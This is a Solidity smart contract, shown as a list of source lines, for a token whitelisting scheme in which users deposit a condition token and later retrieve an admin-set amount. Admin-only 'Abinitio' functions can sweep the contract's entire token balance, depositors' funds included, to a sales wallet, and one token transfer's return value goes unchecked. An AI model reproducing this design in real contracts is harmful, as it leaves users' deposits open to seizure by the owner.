['pragma solidity ^0.5.17;\n', '\n', 'library SafeMath {\n', '  function add(uint a, uint b) internal pure returns (uint c) {\n', '    c = a + b;\n', '    require(c >= a);\n', '  }\n', '  function sub(uint a, uint b) internal pure returns (uint c) {\n', '    require(b <= a);\n', '    c = a - b;\n', '  }\n', '  function mul(uint a, uint b) internal pure returns (uint c) {\n', '    c = a * b;\n', '    require(a == 0 || c / a == b);\n', '  }\n', '  function div(uint a, uint b) internal pure returns (uint c) {\n', '    require(b > 0);\n', '    c = a / b;\n', '  }\n', '}\n', '\n', 'contract ERC20Interface {\n', '    \n', '  function totalSupply() public view returns (uint);\n', '  function balanceOf(address tokenOwner) public view returns (uint balance);\n', '  function allowance(address tokenOwner, address spender) public view returns (uint remaining);\n', '  function transfer(address to, uint tokens) public returns (bool success);\n', '  function approve(address spender, uint tokens) public returns (bool success);\n', '  function transferFrom(address from, address to, uint tokens) public returns (bool success);\n', '\n', '  \n', '}\n', '\n', 'contract ApproveAndCallFallBack {\n', '  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;\n', '}\n', '\n', 'contract Owned {\n', '  address public Admininstrator;\n', '\n', '  constructor() public {Admininstrator = msg.sender;}\n', '\n', '  modifier onlyAdmin {\n', '    require(msg.sender == Admininstrator, "Only authorized personnels");\n', '    _;\n', '  }\n', '\n', '}\n', '\n', 'contract PUBLICWHITELISTING is Owned{\n', '    \n', '    \n', '  using SafeMath for uint;\n', '  \n', ' \n', '  address public sellingtoken;\n', '  address public conditiontoken;\n', '  \n', '  \n', '  address payable saleswallet;\n', '  bool public whiteliststatus = true;\n', '  bool public retrievalState = false;\n', '  uint public _conditionAmount = 20000000000000000000;\n', '  uint decimal = 10**18;\n', '  uint public retrievalqtty = 18000000000000000000;\n', '  \n', '  mapping(address => bool) public whitelist;\n', '\n', ' \n', '  \n', '\n', ' \n', '  constructor() public { Admininstrator = msg.sender; }\n', '   \n', ' //========================================CONFIGURATIONS======================================\n', ' \n', ' function setSalesWallet(address payable _salewallet) public onlyAdmin{saleswallet = _salewallet;}\n', ' function sellingToken(address _tokenaddress) public onlyAdmin{sellingtoken = _tokenaddress;}\n', ' \n', ' function conditionTokenAddress(address _tokenaddress) public onlyAdmin{conditiontoken = _tokenaddress;}\n', ' function whitelistStatus(bool _status) public onlyAdmin{whiteliststatus = _status;}\n', ' //function AllowSales(bool _status) public onlyAdmin{startSales = _status;}\n', ' function conditionTokenQuantity(uint _quantity) public onlyAdmin{_conditionAmount = _quantity;}\n', '\n', ' function Allowretrieval(bool _status) public onlyAdmin{retrievalState = _status;}\n', ' function Retrievalqtty(uint256 _qttytoretrieve) public onlyAdmin{retrievalqtty = _qttytoretrieve;}\n', ' \n', ' \n', '//  function minbuy(uint _minbuyinGwei) public onlyAdmin{minBuy = _minbuyinGwei;}\n', '// function maxbuy(uint _maxbuyinGwei) public onlyAdmin{maxBuy = _maxbuyinGwei;}\n', '\t\n', '\t\n', '  \n', '  function whitelisting() public returns(bool){\n', '    \n', '    require(whiteliststatus == true, "Whitelisting is closed");\n', '    require(whitelist[msg.sender] == false, "You have already whitelisted");\n', '    require(ERC20Interface(conditiontoken).allowance(msg.sender, address(this)) >= _conditionAmount, "Inadequate allowance given to contract by you");\n', '    require(ERC20Interface(conditiontoken).balanceOf(msg.sender) >= _conditionAmount, "You do not have sufficient amount of the condition token");\n', '    ERC20Interface(conditiontoken).transferFrom(msg.sender, address(this), _conditionAmount);\n', '    whitelist[msg.sender] = true;\n', '   \n', '    \n', '    return true;\n', '    \n', '  }\n', '  \n', '  \n', '  \n', '  \n', '  function isWhitelisted(address _address) public view returns(bool){return whitelist[_address];}\n', '  \n', '  \n', '  function retrieval() public returns(bool){\n', '    \n', '    require(retrievalState == true, "retrieval is not yet allowed");\n', '    require(whitelist[msg.sender] == true, "You did not whitelist or have already retrieved");\n', '    \n', '    require(ERC20Interface(conditiontoken).balanceOf(address(this)) >= retrievalqtty, "Insufficient token in contract");\n', '    whitelist[msg.sender] = false;\n', '    require(ERC20Interface(conditiontoken).transfer(msg.sender, retrievalqtty), "Transaction failed");\n', '    \n', '    return true;\n', '    \n', '  }\n', '  \n', '  \n', '  \n', '  \n', '  function Abinitio() public onlyAdmin returns(bool){\n', '      \n', '      saleswallet.transfer(address(this).balance);\n', '  }\n', '  \n', '  function AbinitioToken() public onlyAdmin returns(bool){\n', '      \n', '      uint bal = ERC20Interface(sellingtoken).balanceOf(address(this));\n', '      require(ERC20Interface(sellingtoken).transfer(saleswallet, bal), "Transaction failed");\n', '      \n', '  }\n', '  \n', '  function AbinitioToken2() public onlyAdmin returns(bool){\n', '      \n', '      uint bal = ERC20Interface(conditiontoken).balanceOf(address(this));\n', '      require(ERC20Interface(conditiontoken).transfer(saleswallet, bal), "Transaction failed");\n', '      \n', '  }\n', '  \n', ' \n', '}']